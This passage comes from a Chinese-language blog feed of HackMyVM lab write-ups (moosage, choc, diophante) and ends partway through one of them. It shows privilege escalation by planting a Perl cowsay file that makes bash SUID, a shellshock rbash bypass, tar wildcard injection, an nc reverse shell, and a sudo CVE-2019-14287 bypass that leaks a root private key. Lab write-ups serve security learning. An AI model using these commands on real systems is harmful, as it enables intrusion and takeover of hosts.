individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Apr 22 14:04:44 2021 from 192.168.1.58
baca@moosage:~$

<br>从这个牛牛说话就能联想到ssh登录时使用了 Cowsay<br>
我们找一下这个cowsay有很多种动物可以选择。但是我每次登录都是牛牛在说话。那么我们只需要找到牛牛的配置文件即可<br>baca@moosage:/usr/share/cowsay/cows$ find / -name cow* 2&gt;/dev/null
/usr/share/cowsay/cows/cower.cow

baca@moosage:/usr/share/cowsay/cows$ ls -la
total 192
drwxr-xr-x 2 root root 4096 Apr 22  2021 .
drwxr-xr-x 3 root root 4096 Apr 22  2021 ..
-rw-rw-rw- 1 root root  115 Feb  3  2019 apt.cow
-rw-rw-rw- 1 root root  310 Aug 14  1999 bud-frogs.cow
-rw-rw-rw- 1 root root  123 Aug 14  1999 bunny.cow
-rw-rw-rw- 1 root root 1127 Feb  3  2019 calvin.cow
-rw-rw-rw- 1 root root  480 Aug 14  1999 cheese.cow
-rw-rw-rw- 1 root root  181 Feb  3  2019 cock.cow
-rw-rw-rw- 1 root root  230 Aug 14  1999 cower.cow

<br>我们可以修改 cower.cow 然后ssh登录 实现提权<br>
.cow 文件的本质是Perl脚本
<br>修改 cower.cow 内容<br>#!/usr/bin/perl
use strict; use warnings;
# 设置 SUID 位到 /bin/bash
my $file = "/bin/bash"; my $permissions = 04755; # 4 表示 SUID 位
# 更改文件权限
if (chmod $permissions, $file) { print "Successfully set SUID bit on $file.\n";
} else {
    die "Failed to set SUID bit on $file: $!\n";
}

<br>┌──(root㉿kali)-[~/Desktop/hmv/moosage]
└─# ssh -i /root/.ssh/id_rsa baca@192.168.56.22
Successfully set SUID bit on /bin/bash.
 ___________________________
&lt; WELCOME TO MOOSAGE SYSTEM &gt;
 ---------------------------

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Dec 23 10:02:42 2024 from 192.168.56.6
-bash-5.0$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
-bash-5.0$ bash -p
bash-5.0#
bash-5.0# whoami
root


bash-5.0# sh flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: moosage

PWNED DATE: Mon 23 Dec 2024 10:04:58 AM EST

WHOAMI: uid=1000(baca) gid=1000(baca) groups=1000(baca),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

FLAG: Keep trying.

------------------------

]]></description><link>https://www.c1trus.top/24-渗透/hmv/46.moosage.html</link><guid isPermaLink="false">24-渗透/HMV/46.moosage.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223215258.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223215258.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[45.choc]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. ftp匿名登录" data-href="#2.2. ftp匿名登录" href="https://www.c1trus.top/about:blank#2.2._ftp匿名登录" class="internal-link" target="_self" rel="noopener nofollow">2.2. ftp匿名登录</a>
<br><a data-tooltip-position="top" aria-label="2.3. rbash绕过" data-href="#2.3. rbash绕过" href="https://www.c1trus.top/about:blank#2.3._rbash绕过" class="internal-link" target="_self" rel="noopener nofollow">2.3. rbash绕过</a>


<br><a data-tooltip-position="top" aria-label="3. 提权到torki用户" data-href="#3. 提权到torki用户" href="https://www.c1trus.top/about:blank#3._提权到torki用户" class="internal-link" target="_self" rel="noopener nofollow">3. 提权到torki用户</a>

<br><a data-tooltip-position="top" aria-label="3.1. tar漏洞提权" data-href="#3.1. tar漏洞提权" href="https://www.c1trus.top/about:blank#3.1._tar漏洞提权" class="internal-link" target="_self" rel="noopener nofollow">3.1. tar漏洞提权</a>


<br><a data-tooltip-position="top" aria-label="4. 提权到sarah" data-href="#4. 提权到sarah" href="https://www.c1trus.top/about:blank#4._提权到sarah" class="internal-link" target="_self" rel="noopener nofollow">4. 提权到sarah</a>
<br><a data-tooltip-position="top" aria-label="5. 提权root" data-href="#5. 提权root" href="https://www.c1trus.top/about:blank#5._提权root" class="internal-link" target="_self" rel="noopener nofollow">5. 提权root</a><br>
- <a data-tooltip-position="top" aria-label="5.1. sudo root 权限绕过 CVE-2019-14287" data-href="#5.1. sudo root 权限绕过 CVE-2019-14287" href="https://www.c1trus.top/about:blank#5.1._sudo_root_权限绕过_CVE-2019-14287" class="internal-link" target="_self" rel="noopener nofollow">5.1. sudo root 权限绕过 CVE-2019-14287</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Choc" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Choc</a><br>
作者 <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=cromiphi" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=cromiphi" target="_blank">cromiphi</a><br>
难度 ⭐️⭐️⭐️⭐️⭐️
<br><br><br>┌──(root㉿kali)-[~/Desktop/hmv/choc]
└─# nmap 192.168.56.15 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 23:44 EST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 100.00% done; ETC: 23:44 (0:00:00 remaining)
Nmap scan report for 192.168.56.15
Host is up (0.00083s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
MAC Address: 08:00:27:E3:98:E8 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.57 seconds

<br><br>┌──(root㉿kali)-[~/Desktop/hmv/choc]
└─# ftp 192.168.56.15
Connected to 192.168.56.15.
220 (vsFTPd 3.0.3)
Name (192.168.56.15:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||58838|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 Apr 20  2021 .
drwxr-xr-x    2 0        114          4096 Apr 20  2021 ..
-rwxrwxrwx    1 0        0            1811 Apr 20  2021 id_rsa
226 Directory send OK.
ftp&gt; get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||37705|)
150 Opening BINARY mode data connection for id_rsa (1811 bytes).
100% |**********************************************************|  1811      824.88 KiB/s    00:00 ETA
226 Transfer complete.
1811 bytes received in 00:00 (647.58 KiB/s)
ftp&gt; exit
221 Goodbye.

<br>获取到了私钥,但是不知道对应的用户名<br>我们利用私钥生成对应的公钥即可<br>┌──(root㉿kali)-[~/Desktop/hmv/choc]
└─# ssh-keygen -y -f id_rsa
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxAJzNHJ+k1YTZSCqbdmY4jXCNGuDrEeHLmsEHMDkiHpT1y+IeLVxyUurWkDwwWAes78bfHHkXbINVj7491EjoH3r4OwxhhZa4z9mtWaJlWtdllzEysC6GUr1TIPXc3vZkiPbUuAWYrz4bHbpQoIuYl+cAgOKPKbFRRhfLIOqk+1bsM+LVcWgwT5ZICpxiTOiISNAUPgInrBKkrlFott+jNPuZwTy/yV7Ix4CejknMGg1MquyP+2LyzeEpmf+OcwoS5r/jVWlSddO1Fim373lTNpDOKj2kwNsa9zO/9jAjN7uhu1mh7wb8ldU0ImCep4C6drJSTbfYOLlV7rLgfH0X carl@choc

<br>获取到了用户名是 carl@choc<br>ssh连接后会立马中断连接。<br>┌──(root㉿kali)-[~/Desktop/hmv/choc]
└─# ssh -i id_rsa carl@192.168.56.15


##############################
#                            #
#       Welcome to my SSH !  #
#       Carl.                #
#                            #
##############################






        ███████╗ █████╗ ██╗██╗     ███████╗██████╗     ██╗      ██████╗ ██╗
        ██╔════╝██╔══██╗██║██║     ██╔════╝██╔══██╗    ██║     ██╔═══██╗██║
        █████╗  ███████║██║██║     █████╗  ██║  ██║    ██║     ██║   ██║██║
        ██╔══╝  ██╔══██║██║██║     ██╔══╝  ██║  ██║    ██║     ██║   ██║██║
        ██║     ██║  ██║██║███████╗███████╗██████╔╝    ███████╗╚██████╔╝███████╗
        ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝     ╚══════╝ ╚═════╝ ╚══════╝



Connection to 192.168.56.15 closed.

<br>看来应该给我们了一个rbash<br><br>尝试一些方法进行绕过<br>
这里可以通过shellshock漏洞绕过<br>┌──(root㉿kali)-[~/Desktop/hmv/choc]
└─# ssh -i id_rsa carl@192.168.56.15 -t  "() { :; }; /bin/bash"


##############################
#                            #
#       Welcome to my SSH !  #
#       Carl.                #
#                            #
##############################


carl@choc:~$

<br><br>在 torki用户 目录下发现一个 backup.sh 和一个 diary.txt<br>-rw-r--r-- 1 torki torki  325 Apr 20  2021 diary.txt
carl@choc:/home/torki/secret_garden$ cat diary.txt


April 18th 2021
Last night I dreamed that I was at the beach with scarlett johansson, worst wake up call of my life!

September 12th 2309
I invented a time machine.The world is still crazy, territorial and proud !!

A day in -4.5000000000
The human doesn't exist yet and that's fucking great!!! but I'm a little bored...

<br>猜测这个 backup.sh 应该会被定时执行<br>
使用pspy64监控 验证正确<br>2024/12/22 06:45:01 CMD: UID=1001 PID=14411  | /bin/sh -c PATH=.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games &amp;&amp; export PATH &amp;&amp;  bash /home/sarah/.local/script.sh
2024/12/22 06:45:01 CMD: UID=1000 PID=14412  | /bin/sh -c bash /home/torki/backup.sh
2024/12/22 06:45:01 CMD: UID=1001 PID=14413  | bash /home/sarah/.local/script.sh
2024/12/22 06:45:01 CMD: UID=1000 PID=14414  | bash /home/torki/backup.sh
2024/12/22 06:45:02 CMD: UID=1002 PID=14415  | /bin/bash
2024/12/22 06:45:06 CMD: UID=1002 PID=14416  | /bin/bash
2024/12/22 06:45:06 CMD: UID=1002 PID=14417  | /bin/bash
2024/12/22 06:45:06 CMD: UID=1002 PID=14419  | /bin/bash
2024/12/22 06:45:06 CMD: UID=1002 PID=14421  | /bin/bash
2024/12/22 06:45:10 CMD: UID=1002 PID=14423  | /bin/bash
2024/12/22 06:45:19 CMD: UID=1002 PID=14425  | /bin/bash
2024/12/22 06:46:01 CMD: UID=0    PID=14427  | /usr/sbin/CRON -f
2024/12/22 06:46:01 CMD: UID=0    PID=14426  | /usr/sbin/cron -f
2024/12/22 06:46:01 CMD: UID=0    PID=14428  | /usr/sbin/CRON -f
2024/12/22 06:46:01 CMD: UID=0    PID=14429  | /usr/sbin/CRON -f
2024/12/22 06:46:01 CMD: UID=1000 PID=14430  | /bin/sh -c bash /home/torki/backup.sh
2024/12/22 06:46:01 CMD: UID=1000 PID=14431  | bash /home/torki/backup.sh
2024/12/22 06:46:01 CMD: UID=1001 PID=14432  | /bin/sh -c PATH=.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games &amp;&amp; export PATH &amp;&amp;  bash /home/sarah/.local/script.sh
2024/12/22 06:46:01 CMD: UID=1001 PID=14433  | bash /home/sarah/.local/script.sh

<br>可以发现每分钟 torki 用户都会执行<br>bash /home/torki/backup.sh
<br>在tmp目录下发现一个 torki 用户的文件  backup_home.tgz<br>carl@choc:/tmp$ ls -la
total 6988
drwxrwxrwt  8 root  root     4096 Dec 22 06:45 .
drwxr-xr-x 19 root  root     4096 Apr 18  2021 ..
-rw-r--r--  1 torki torki 3082240 Dec 22 06:45 backup_home.tgz
<br>把他传下来解压看一下<br>carl@choc:/tmp$ tar -xvf backup_home.tgz
diary.txt
pspy64

carl@choc:/tmp$ cat diary.txt


April 18th 2021
Last night I dreamed that I was at the beach with scarlett johansson, worst wake up call of my life!

September 12th 2309
I invented a time machine.The world is still crazy, territorial and proud !!

A day in -4.5000000000
The human doesn't exist yet and that's fucking great!!! but I'm a little bored...

<br>
发现就是 torki/secret_garden/diary.txt 的内容<br>
这里我解压出来还有一个pspy64的原因是 我把pspy64下到了 torki/secret_garden/ 这个目录，他这个脚本应该就是打包 torki/secret_garden/ 目录下的所有文件
<br>我们对 /secret_garden/ 是有写入权限的<br><br><a rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/zh/linux-hardening/privilege-escalation/wildcards-spare-tricks#tar" target="_blank">https://book.hacktricks.xyz/zh/linux-hardening/privilege-escalation/wildcards-spare-tricks#tar</a><br>
在 /secret_garden/  目录下执行命令<br>carl@choc:/home/torki/secret_garden$ touch -- '--checkpoint=1'
carl@choc:/home/torki/secret_garden$ touch -- '--checkpoint-action=exec=sh shell.sh'
carl@choc:/home/torki/secret_garden$ echo 'nc -e /bin/bash 192.168.56.6 1234' &gt;shell.sh

(remote) torki@choc:/home/torki/secret_garden$ ls
'--checkpoint=1'  '--checkpoint-action=exec=sh shell.sh'   diary.txt   pspy64   shell.sh

<br>
这里touch 要加 -- 的原因是 让后面的 '' 作为文件名,不然这个单引号会被去掉
<br>然后开启监听等待反弹shell<br>
┌──(root㉿kali)-[~]
└─# pwncat-cs -lp 1234

[01:07:00] Welcome to pwncat 🐈!                                                        __main__.py:164
[01:08:47] received connection from 192.168.56.15:44978                                      bind.py:84
[01:08:47] 0.0.0.0:1234: normalizing shell path                                          manager.py:957
[01:08:48] 192.168.56.15:44978: registered new host w/ db                                manager.py:957
(local) pwncat$
(remote) torki@choc:/home/torki/secret_garden$ whoami
torki
(remote) torki@choc:/home/torki/secret_garden$ id
uid=1000(torki) gid=1000(torki) groups=1000(torki),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

(remote) torki@choc:/home/torki$ cat backup.sh
#!/bin/bash
cd /home/torki/secret_garden
tar cf /tmp/backup_home.tgz *
<br><br>(remote) torki@choc:/home/torki$ sudo -l
User torki may run the following commands on choc:
    (sarah) NOPASSWD: /usr/bin/scapy
<br>
scapy可以用来发各种协议的数据包，但是他实际上是一个python，所以可以利用像python一样开启一个shell
<br>(remote) torki@choc:/home$ sudo -u sarah scapy
WARNING: Cannot read wireshark manuf database
INFO: Can't import matplotlib. Won't be able to plot.
INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
WARNING: Failed to execute tcpdump. Check it is installed and in the PATH
WARNING: No route found for IPv6 destination :: (no default route?)
INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11)
INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication.
WARNING: IPython not available. Using standard Python shell instead.
AutoCompletion, History are disabled.

                     aSPY//YASa
             apyyyyCY//////////YCa       |
            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy
 ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.0
 AYAsAYYYYYYYY///Ps              cY//S   |
         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy
         SPPPP///a          pP///AC//Y   |
              A//A            cyP////C   | Have fun!
              p///Ac            sC///a   |
              P////YCpc           A//A   | Craft packets like I craft my beer.
       scccccp///pSP///p          p//Y   |               -- Jean De Clerck
      sY/////////y  caa           S//P   |
       cayCyayP//Ya              pY/Ya
        sY/PsY////YCc          aC//Yp
         sc  sccaCY//PCypaapyCP//YSs
                  spCPY//////YPSps
                       ccaacs

&gt;&gt;&gt; import os
&gt;&gt;&gt; os.system('/bin/bash')
sarah@choc:/home$ whoami
sarah

<br><br>sarah@choc:~$ cat quotes.txt

 “You must have chaos within you to give birth to a dancing star.”

 “It is not a lack of love, but a lack of friendship that makes unhappy marriages.”

 “The multiplication of our kind borders on the obscene; the duty to love them, on the preposterous.”

“We do not die because we have to die; we die because one day, and not so long ago, our consciousness was forced to deem it necessary.“

“Luke, I am your father"

sarah@choc:~$ cat user.txt
commenquaded

sarah@choc:~$ sudo -l
User sarah may run the following commands on choc:
    (ALL, !root) NOPASSWD: /usr/bin/wall

<br>!root 表示出了root用户 其他用户都可以用 wall 且不输入密码<br><br><a rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/zh/linux-hardening/privilege-escalation#sudo-less-than-v1.28" target="_blank">https://book.hacktricks.xyz/zh/linux-hardening/privilege-escalation#sudo-less-than-v1.28</a><br>Cautionhacktircks 这里是错误的，正确的版本应该是 &lt;1.8.28<br>
<img alt="assets/Pasted image 20241222142725.png" src="https://www.c1trus.top/24-渗透/hmv/assets/pasted-image-20241222142725.png"><br>sarah@choc:/home/torki$ sudo -V
Sudo version 1.8.23
Sudoers policy plugin version 1.8.23
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.23
sarah@choc:/home/torki$ sudo -u#-1 wall --nobanner "/root/.ssh/id_rsa"
<br>wall命令 会向 所有登录的用户 广播消息，所以我们需要用另外一个终端来接受私钥<br>
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAuSMhRxXhWoexxyZWPK4pkjyVHhT1jAmUYdEhKEFBLZh9z93ZW25M
lrj03xjFd4zP5AAHEG9p5h5SNi3ltHTtml7Nj59XlV6Heru/cwX7Yykxu75tZRxzQR4EjV
qUmxvqJgfql+XzKg3JgNwHRpG3tcW8Rdxbb3owVR97kjZP+3kA/pQGrQKdFe893Q1u2oDa
4R+v+jsYmzwjf/1M8m/S+J0hYzTOI+kQlBnZmMvpJYDidmyG1RO3dcLCpxCQpydH7GfO/s
6j0DdCvDr6+8C4eAzgDE5irjdMh2dKySNveNiMuhzsv1PS33ZWgx/ITlxu9zwiuufQm6D5
TcDYKMGCSQAAA8DHBCmTxwQpkwAAAAdzc2gtcnNhAAABAQC5IyFHFeFah7HHJlY8rimSPJ
UeFPWMCZRh0SEoQUEtmH3P3dlbbkyWuPTfGMV3jM/kAAcQb2nmHlI2LeW0dO2aXs2Pn1eV
Xod6u79zBftjKTG7vm1lHHNBHgSNWpSbG+omB+qX5fMqDcmA3AdGkbe1xbxF3FtvejBVH3
uSNk/7eQD+lAatAp0V7z3dDW7agNrhH6/6OxibPCN//Uzyb9L4nSFjNM4j6RCUGdmYy+kl
gOJ2bIbVE7d1wsKnEJCnJ0fsZ87+zqPQN0K8Ovr7wLh4DOAMTmKuN0yHZ0rJI2942Iy6HO
y/U9LfdlaDH8hOXG73PCK659CboPlNwNgowYJJAAAAAwEAAQAAAQAQK31QlBymp4tjdXm6
uwtudlQf2HzJylxnXriip3Bl5xe1/A5r6epOj8Dza1pz4pyVsVrsmI6LRsKvcLrLVBscjI
MvtB8WMLdshNFn3nHia0qoty0e06lNWq3TGsI3+ewtfiuDMNZYKfQbiRwpkbiV67tR7rkd
t3JZPPKyBoRd1kGjnPzJc2DPyaAtJtS21w86ZxJZtaMWUL6SE1+80VWv0XXPtlmAipfdgF
76A/Z4izCNolx0s+Ptus8gqaxJDeGI4xX5aZZ33kc5cSvNjI2hH6kFX39sS7beVz/zYDKA
BkJ0fZpNQ+HZfqGvT93YHAFZVpdlv7ysn16oNkOwZuZxAAAAgQCs/OtmKQ2SXR0ZrVryDk
58HSK2xCRcMaOqNamWSm+JaKEusms25bCD3liQGbazJyy6eS7iR2DOQPYwdU94dak72X+W
xwOexz8pwHGflvrA7SlKW4pXshuccpxgdC/KkqZRQyQvy7NbDTyGM+3uTQSnABmZWl8mJa
NtfY+fCEoKDgAAAIEA5urQzWNxzvBa4krknAuUMRD8TcsL4NjE6QCj9D1KJh2vGiBqNYjH
f6hZ+4LPFlaWiusjxZAF6vIaZJU0UHRzdcITqm1L20CZQr2D3tgWS6+VAGQHb1me5uoC4J
6Px6A7preSEjS2GtECqWxZevl8YqWEJtWaO1WDK61+Mr266UsAAACBAM0/S7QUbRqSmNTq
wd/4y9U4JxtOfeV4O0I+JNlTPkA2vdUeHEwWkKRqk3re72JwYlUAsD4AhXO1oEdfpO32fx
wavKtBNMpI64CiNVrPY8w9DPoWdCzxtFeRq1V50i9wdiVlHIdn0Ac+6T9Wv/0v8J7GXIkH
gskjOtELMuhigHo7AAAACXJvb3RAY2hvYwE=
-----END OPENSSH PRIVATE KEY-----

<br>ssh连接那flag<br>root@choc:~# cat r00t.txt
inesbywal
]]></description><link>https://www.c1trus.top/24-渗透/hmv/45.choc.html</link><guid isPermaLink="false">24-渗透/HMV/45.choc.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 08:41:17 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/hmv/assets/pasted-image-20241222142725.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-渗透/hmv/assets/pasted-image-20241222142725.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[44. Diophante]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. 目录扫描" data-href="#2.2. 目录扫描" href="https://www.c1trus.top/about:blank#2.2._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.2. 目录扫描</a>
<br><a data-tooltip-position="top" aria-label="2.3. knock" data-href="#2.3. knock" href="https://www.c1trus.top/about:blank#2.3._knock" class="internal-link" target="_self" rel="noopener nofollow">2.3. knock</a>


<br><a data-tooltip-position="top" aria-label="3. WordPress利用" data-href="#3. WordPress利用" href="https://www.c1trus.top/about:blank#3._WordPress利用" class="internal-link" target="_self" rel="noopener nofollow">3. WordPress利用</a>

<br><a data-tooltip-position="top" aria-label="3.1. wpscan扫描" data-href="#3.1. wpscan扫描" href="https://www.c1trus.top/about:blank#3.1._wpscan扫描" class="internal-link" target="_self" rel="noopener nofollow">3.1. wpscan扫描</a>
<br><a data-tooltip-position="top" aria-label="3.2. smtp上传后门" data-href="#3.2. smtp上传后门" href="https://www.c1trus.top/about:blank#3.2._smtp上传后门" class="internal-link" target="_self" rel="noopener nofollow">3.2. smtp上传后门</a>


<br><a data-tooltip-position="top" aria-label="4. 提权" data-href="#4. 提权" href="https://www.c1trus.top/about:blank#4._提权" class="internal-link" target="_self" rel="noopener nofollow">4. 提权</a><br>
- <a data-tooltip-position="top" aria-label="4.1. 提权leonard用户" data-href="#4.1. 提权leonard用户" href="https://www.c1trus.top/about:blank#4.1._提权leonard用户" class="internal-link" target="_self" rel="noopener nofollow">4.1. 提权leonard用户</a><br>
- <a data-tooltip-position="top" aria-label="4.2. LD劫持提权root" data-href="#4.2. LD劫持提权root" href="https://www.c1trus.top/about:blank#4.2._LD劫持提权root" class="internal-link" target="_self" rel="noopener nofollow">4.2. LD劫持提权root</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Diophante" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Diophante</a><br>
作者 <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=cromiphi" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=cromiphi" target="_blank">cromiphi</a><br>
难度 ⭐️⭐️⭐️⭐️⭐️
<br><br><br>┌──(root㉿kali)-[~]
└─# nmap 192.168.56.13 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 05:01 EST
Nmap scan report for 192.168.56.13
Host is up (0.0031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE    SERVICE
22/tcp open     ssh
25/tcp filtered smtp
80/tcp open     http
MAC Address: 08:00:27:B8:67:CA (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 28.73 seconds

<br>25 端口被防火墙过滤了 多半是需要knock<br><br>┌──(root㉿kali)-[~]
└─# dirsearch -u http://192.168.56.13
^[[A/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_192.168.56.13/_24-12-21_05-06-58.txt

Target: http://192.168.56.13/

[05:06:58] Starting:
[05:06:59] 403 -  278B  - /.ht_wsr.txt
[05:06:59] 403 -  278B  - /.htaccess.orig
[05:06:59] 403 -  278B  - /.htaccess.bak1
[05:06:59] 403 -  278B  - /.htaccess.save
[05:06:59] 403 -  278B  - /.htaccess.sample
[05:06:59] 403 -  278B  - /.htaccess_extra
[05:06:59] 403 -  278B  - /.htaccess_orig
[05:06:59] 403 -  278B  - /.htaccess_sc
[05:06:59] 403 -  278B  - /.htaccessOLD
[05:06:59] 403 -  278B  - /.htaccessBAK
[05:06:59] 403 -  278B  - /.htaccessOLD2
[05:06:59] 403 -  278B  - /.htm
[05:06:59] 403 -  278B  - /.htpasswd_test
[05:06:59] 403 -  278B  - /.html
[05:06:59] 403 -  278B  - /.htpasswds
[05:06:59] 403 -  278B  - /.httr-oauth
[05:06:59] 403 -  278B  - /.php
[05:07:05] 301 -  313B  - /blog  -&gt;  http://192.168.56.13/blog/
[05:07:09] 200 -    3KB - /blog/wp-login.php
[05:07:09] 200 -    5KB - /blog/
[05:07:15] 403 -  278B  - /server-status
[05:07:15] 403 -  278B  - /server-status/

Task Completed

┌──(root㉿kali)-[~/Desktop/hmv/Diophanate]
└─# gobuster dir -u http://192.168.56.13 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.13
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10701]
/blog                 (Status: 301) [Size: 313] [--&gt; http://192.168.56.13/blog/]
/note.txt             (Status: 200) [Size: 36]

<br><br>/note.txt<br>┌──(root㉿kali)-[~/Desktop/hmv/Diophanate]
└─# curl http://192.168.56.13/note.txt
Don't forget: 7000 8000 9000

admin
<br>这应该就是要敲门的端口<br>
┌──(root㉿kali)-[~/Desktop/hmv/Diophanate]
└─# knock 192.168.56.13 7000 8000 9000 -v
hitting tcp 192.168.56.13:7000
hitting tcp 192.168.56.13:8000
hitting tcp 192.168.56.13:9000

┌──(root㉿kali)-[~/Desktop/hmv/Diophanate]
└─# nmap 192.168.56.13
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 05:18 EST
Nmap scan report for 192.168.56.13
Host is up (0.022s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
80/tcp open  http
MAC Address: 08:00:27:B8:67:CA (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds

<br><br>发现存在wp-login 路径 多半存在 WordPress 服务<br><img alt="wg0pmbjq28a" src="https://www.c1trus.top/24-渗透/hmv/assets/a7u4tewdaek.png"><br>查看源码可以发现一个域名 hard<img alt="7lzau0bx3eu" src="https://www.c1trus.top/24-渗透/hmv/assets/4ffjhly5t19.png"><br>
添加一下<br><br>┌──(root㉿kali)-[~]
└─# wpscan --url http://hard/blog --api-token xxxxxx
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | ''_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
